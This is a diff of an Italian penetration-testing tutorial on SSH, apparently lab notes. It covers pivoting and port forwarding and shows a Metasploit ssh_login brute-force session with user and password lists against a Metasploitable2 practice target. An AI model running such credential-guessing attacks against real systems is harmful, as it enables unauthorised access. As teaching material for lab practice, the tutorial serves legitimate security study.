@@ -1,11 +1,11 @@
 # SSH: Secure Shell
 
-SSH è un’alternativa, a livello trasporto, per realizzare comunicazioni sicure rispetto a TLS ed è un protocollo crittato usato per collegarsi ad una macchina remota in maniera sicura. Il protocollo è costituito di 3 livelli: trasporto, autenticazione e connessione 
+SSH è un’alternativaa TLS per realizzare comunicazioni sicure a livello trasporto. É un protocollo crittografico usato per collegarsi ad una macchina remota in maniera sicura. Il protocollo è costituito di 3 livelli: trasporto, autenticazione e connessione.
 
-Quale può essere l'utilizzo di un black hat? Principalmente può usarlo per prendere il possesso su una macchina diversa dalle proprie e mascherare le sue intenzioni. La macchina appena rubata viene chiamata __Pivot__ proprio perché sarà la macchina carine dalla quale si fanno partire le scansioni/enumeration/attacchi. Questo tipo di protocollo viene poi ulteriormente sfruttato per effettuare hoping tra una macchina all'altra fino ad arrivare a zone di sicurezza aziendale più avanzate.
-Esempio: Mettiamo caso che siamo entrati in una macchina target, dobbiamo fare privilage escalation, procediamo con l'enumerazione e troviamo un’applicazione HTTP vulnerabile. Ho un terminale attivo ma non gli altri strumenti per analizzare facilmente http. Procedo quindi, attraverso un remote port forwording mandandomi quella porta sulla mia macchina Kali facendo in modo di usufruire di quella porta attraverso i nostri tool.
+Ci chiediamo in che modo un attaccante possa sfruttare questo protocollo. Principalmente può essere usato per prendere il controllo di una macchina diversa dalla propria e di conseguenza anonimizzarsi. La macchina sottratta viene chiamata __Pivot__ proprio perché sarà la macchina cardine dalla quale si fanno partire le varie scansioni/enumeration/attacchi. Questo tipo di protocollo viene poi inoltre sfruttato per effettuare hopping tra una macchina e l'altra per entrare in perimetri di sicurezza ristretti, come ad esempio una intranet aziendale.
+Esempio: siamo entrati in possesso di una macchina target, dobbiamo fare privilege escalation, procediamo con l'enumerazione e troviamo un’applicazione HTTP vulnerabile. Ho un terminale attivo ma non gli altri strumenti per analizzare facilmente http. Procedo quindi, per mezzo di un remote port forwording, a inoltrare quella porta sulla mia macchina Kali così da poterne disporre e analizzarla attraverso i nostri tool.
 
-Riprendendo l'output dell'enumeration effettuata in precedenza sulla macchina target notiamo che la versione installata di SSH è OpenSSH 4.7p1 Debian 8ubuntu1 e addirittura otteniamo informazioni sulla coppia di chiavi del target SSH per l'autenticazione. Una usa l'algoritmo di DSA, l'altra RSA. 
+Riprendendo l'output dell'enumeration effettuata in precedenza notiamo che l'implementazione installata di SSH è OpenSSH 4.7p1 Debian 8ubuntu1 e addirittura otteniamo informazioni sulla coppia di chiavi che il target utilizza per l'autenticazione. Una usa l'algoritmo DSA, l'altra RSA. 
 ```
 PORT      STATE  SERVICE     VERSION
 22/tcp    open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
@@ -14,18 +14,12 @@ PORT      STATE  SERVICE     VERSION
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 ```
 
-Questa volta purtroppo non possiamo fare affidamento sul sito [exploit-db.com](exploit-db.com) poiché anche se cercassimo questa versione di OpenSSH non troveremmo nulla, quindi cosa possiamo fare? Prima di tutto sappiamo che l'autenticazione attraverso SSH è possibile in tre vie:
-  1) __Publickey__, dove si utilizzano chiave pubblica e privata
-  2) __Password__, si invia la password in chiaro ma protetta dal Transport Layer Protocol
+Questa volta purtroppo non possiamo fare affidamento al sito [exploit-db.com](exploit-db.com) poiché cercando questa versione di OpenSSH non troviamo particolari vulnerabilità note, quindi cosa possiamo fare? Prima di tutto sappiamo che l'autenticazione con SSH è possibile in tre modi:
+  1) __Publickey__, dove si utilizzano chiave pubblica e privata.
+  2) __Password__, si invia la password in chiaro ma protetta dal Transport Layer Protocol.
   3) __Hostbased__, dove si verifica l'identità dell'host più che quella dell'utente.
 
-Molto spesso il problema di questa configurazione è che __l’user__ e la __password__ sono sempre uguali. In genere per SSH si cerca sempre di effettuare __attacchi a dizionario__ o a __forza bruta__, ovviamente questa cosa possiamo farla  in metasploit. Lanciamo nuovamente il tool con il comando:
-use auxiliary/scanner/ssh/ssh_login
-
-
-```
-msfconsole
-```
+Molto spesso il problema di questa configurazione è che __l’user__ e la __password__ sono sempre uguali. In genere per SSH si cerca di effettuare __attacchi a dizionario__ o a __forza bruta__, ovviamente questa cosa possiamo automatizzarla in metasploit. Lanciamo nuovamente il tool con il comando `msfconsole`.
 Nuovamente andiamo a cercare se tra i moduli degli exploit presenti ce n'è uno relativo al servizio che vogliamo attaccare, lanciamo quindi il comando `search ssh_login` la cui esecuzione produce il seguente output:
 
 ```
@@ -43,10 +37,12 @@ Matching Modules
 Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
 ```
 
-Come si vede la ricerca ha avuto esito positivo, è stato trovati ben due moduli. Il primo modulo non solo testa un insieme di credenziali classiche per quel tipo di indirizzi IP ma può anche tentare un approccio brute force; perfetto per i nostri scopi.
+Come si vede la ricerca ha avuto esito positivo, sono stati trovati ben due moduli. Il primo modulo non solo testa un insieme di credenziali classiche per quel tipo di indirizzi IP ma può anche tentare un approccio brute force; perfetto per i nostri scopi.
 Il secondo modulo invece tenta l'approccio attraverso l'autenticazione a chiave pubblica __sapendo che questo metodo è più sicuro__ come opera il modulo? Quello che cerca di fare è scovare una porzione della chiave privata che non sia stata conservata a dovere e provare ad effettuare il login verso diversi dispositivi cercando la combinazione corretta.
 
-Visto che abbiamo con noi due file chiamati __users.txt__ e __passwords.txt__ tentiamo il primo approccio.
+~~Visto che abbiamo con noi due file chiamati __users.txt__ e __passwords.txt__ tentiamo il primo approccio.~~</br>
+Da dove li abbiamo cacciati? lol.
+
 ```
 msf6 > use 0
 msf6 auxiliary(scanner/ssh/ssh_login) > show options
@@ -75,7 +71,7 @@ Module options (auxiliary/scanner/ssh/ssh_login):
 
 ```
 
-Settiamo tra le due opzioni __USER_AS_PASS__ e __PASS_FILE__ proprio per utilizzare i due file a nostra disposizione e cercare di trovare una corrispondenza per accedere alla macchina tramite il servizio SSH.
+Settiamo tra le due opzioni __USERPASS_FILE__ e __PASS_FILE__ proprio per utilizzare i due file a nostra disposizione e cercare di trovare una corrispondenza per accedere alla macchina tramite il servizio SSH.
 
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /root/metasploitable2/users.txt
@@ -92,7 +88,7 @@ msf6 auxiliary(scanner/ssh/ssh_login) > exploit
 
 ```
 
-Facendo così otterremmo un classico attacco a forza bruta ma il problema sta proprio nella complessità computazionale, se nei nostri file avessimo N entry il tempo di exploit sarebbe di N^N; cosa per nulla fattibile a meno che non siamo degli elfi. Per questo motivo per velocizzare l'attacco settiamo i seguenti parametri e rilanciamo l'exploit
+Facendo così otterremmo un classico attacco a forza bruta ma il problema sta proprio nella complessità computazionale, se nei nostri file avessimo N entry il tempo di exploit sarebbe O(N^2); che ci porterebbe a tempistiche insostenibili a meno di non essere degli elfi. Per questo motivo per velocizzare l'attacco settiamo i seguenti parametri e rilanciamo l'exploit
 
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME msfadmin
@@ -100,7 +96,7 @@ USERNAME => msfadmin
 ```
 Questo username lo possiamo ottenere in diversi modi, uno dei quali è proprio l'attacco FTP visto precedentemente.
 
-<img src="/imgs/ssh_exploit.png" width="800"> </br>
+<img src="/imgs/ssh_exploit.png" width="1000"> </br>
 
 Una volta ottenuti username e password non ci resta che tentare l'accesso tramite il protocollo e vedere cosa abbiamo ricavato
 
